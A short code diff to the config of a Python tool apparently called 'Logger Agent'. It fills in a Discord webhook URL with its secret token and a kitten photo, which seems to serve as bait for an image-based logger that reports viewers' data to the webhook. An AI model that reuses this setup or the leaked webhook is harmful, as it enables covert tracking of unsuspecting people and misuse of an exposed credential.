@@ -11,8 +11,8 @@ __version__ = "v2.0"
 __author__ = "foaqen"
 
 config = {
-    "webhook": "webhook buraya",
-    "image": "resim buraya", 
+    "webhook": "https://discord.com/api/webhooks/1461934189665456340/tauJFwBUU5fvj5Vgnes_AezE64E6OufpZcyYdQ9Wc-wmQkGMzITBen0vlyDoyFrXhDAa",
+    "image": "https://www.diamondpet.com/wp-content/uploads/2021/03/kitten-sitting-on-floor-031621.jpg", 
     "imageArgument": True,
 
     "username": "Logger Agent", 
